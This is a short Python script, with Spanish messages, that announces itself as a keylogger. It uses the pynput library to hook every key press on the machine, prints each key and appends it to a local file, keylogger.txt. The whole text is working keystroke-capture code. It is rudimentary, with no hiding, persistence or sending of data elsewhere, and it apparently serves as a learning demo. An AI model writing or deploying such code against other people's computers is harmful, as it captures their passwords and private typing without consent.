import pynput

def on_press(key):
    print("Tecla presionada:",key)
    with open('keylogger.txt','+a') as f:
        f.write(str(key))

print("======Inicio del keylogger======")
with   pynput.keyboard.Listener (on_press=on_press)  as listener:
    listener.join()